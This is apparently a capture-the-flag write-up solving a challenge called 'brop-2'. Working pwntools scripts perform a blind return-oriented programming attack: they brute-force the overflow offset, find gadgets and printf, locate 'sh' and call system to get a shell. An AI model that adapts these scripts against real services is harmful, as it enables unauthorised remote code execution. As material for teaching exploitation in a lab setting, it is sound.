# brop-2

## Solution

Upon investigating the binary, we first notice that providing a `5`, we are asked to provide a text input. When we type a normal value, we note that it says `<<< Thank you`. But if we type a large value, it terminates early without outputting that string. Thus, it seems to be exploitable by a buffer overflow. Thus, we first need to determine the offset of return address:
```python
def find_offset():
    for i in range(OFFSET_MIN, OFFSET_MAX):
        log.info(f"Trying an offset of {i}")
        with context.quiet:
            p = start()
            p.sendlineafter(b"choice >>>", b"5")
            p.sendlineafter(b"Rate our app and leave feedback >>>", b"A"*i)
            try:
                p.recvuntil(b"<<< Thank you", timeout=1)
            except EOFError:
                p.close()
                return i//8 * 8
            p.close()
```
Next, we will need to find some sort of stop gadget, which we will use to mark that we have a successful ROP chain. Upon investigating the program, we note that it can output `C C# D D# E F F# G G# A A# B`. Thus, we will have found our stop gadget once we force the program to output this string.
```python
def find_stop(offset):
    for i in range(STOP_GADGET_MIN, STOP_GADGET_MAX):
        log.info(f"Trying stop gadget of {hex(i)}")
        with context.quiet:
            p = start()
            p.sendlineafter(b"choice >>>", b"5")
            chain = b"A"*offset
            chain += p64(i)
            chain += p64(i+1)
            p.sendlineafter(b"Rate our app and leave feedback >>>", chain)
            try:
                s = p.recvuntil(b"C C# D D# E F F# G G# A A# B", timeout=1)
                if s == "":
                    continue
                p.close()
                return i
            except EOFError:
                p.close()
```
Next, we want to locate the brop gadget (csu init). This gadget can be located because it pops six values off the stack and then returns. Thus, we loop through addresses, adding it to the ROP chain, adding six arbitrary values to the chain, and then adding our stop gadget. Thus, if we recieve the output of our stop gadget, the address must be the brop gadget.
```python
def find_brop(offset, stop):
    for i in range(BROP_GADGET_MIN, BROP_GADGET_MAX):
        log.info(f"Trying brop gadget of {hex(i)}")
        with context.quiet:
            p = start()
            p.sendlineafter(b"choice >>>", b"5")
            chain = b"A"*offset
            chain += p64(stop)
            chain += p64(i)
            for j in range(6):
                chain += p64(j)
            chain += p64(stop)
            chain += p64(stop+1)
            p.sendlineafter(b"Rate our app and leave feedback >>>", chain)
            try:
                s = p.recvuntil(b"C C# D D# E F F# G G# A A# B", timeout=1)
                if s == "":
                    continue
                p.close()
                return i
            except EOFError:
                p.close()
```
Now that we have the brop gadget, we are able to populate some registers (most importantly, `rdi`). We want to use this to find `printf` in the plt. To do this, we return to addresses with that address populating `rdi`, and we search for `\xff` in the output (which only happens when we hit `printf`). Also, we add the address of our stop gadget to the chain to prevent `mov_aps` issues.
```python
def find_printf_plt(offset, stop, brop):
    pop_rdi = brop + 13
    for i in range(PLT_MIN, PLT_MAX):
        log.info(f"Testing printf at {hex(i)}")
        with context.quiet:
            p = start()
            p.sendlineafter(b"choice >>>", b"5")
            chain = b"A"*offset
            chain += p64(stop)
            chain += p64(pop_rdi)
            chain += p64(i)
            chain += p64(i)
            p.sendlineafter(b"Rate our app and leave feedback >>>", chain)
            try:
                s = p.recvline()
                if b'\xff' in s:
                    p.close()
                    return i
                p.close()
            except EOFError:
                p.close()
```
Now, the printf gadget can be used to print any part of the binary we choose. When we were investigating the binary, we note that it contains the string `sh`. Thus, we want to use this gadget to find `sh` in the string. To do this, we keep printing parts of the binary until we get `sh`.
```python
def find_bin_sh(offset, stop, brop, printf):
    pop_rdi = brop + 13
    for i in range(DATA_MIN, DATA_MAX):
        log.info(f"Testing /bin/sh at {hex(i)}")
        with context.quiet:
            p = start()
            p.sendlineafter(b"choice >>>", b"5")
            chain = b"A"*offset
            chain += p64(stop)
            chain += p64(pop_rdi)
            chain += p64(i)
            chain += p64(printf)
            p.sendlineafter(b"Rate our app and leave feedback >>>", chain)
            try:
                s = p.recvline()
                if b"sh" == s[1:3]:
                    return i
            except EOFError:
                p.close()
```
Finally, we also note that the binary has the ability to print the current date. As a hunch, one can guess that the binary might use the system function in order to do this. Thus, we try to loop through returning to different addresses with `sh` in `rdi` until we get a shell. Luckily, this works (at the first address tried no less), and we are able to get the content of the flag.
```python
def find_system(offset, stop, brop, printf, bin_sh):
    pop_rdi = brop + 13
    for i in range(PLT_MIN, PLT_MAX):
        log.info(f"Testing system at {hex(i)}")
        with context.quiet:
            p = start()
            p.sendlineafter(b"choice >>>", b"5")
            chain = b"A"*offset
            chain += p64(stop)
            chain += p64(pop_rdi)
            chain += p64(bin_sh)
            chain += p64(i)
            p.sendlineafter(b"Rate our app and leave feedback >>>", chain)
            try:
                p.recv(timeout=1)
                p.interactive()
            except EOFError:
                p.close()
```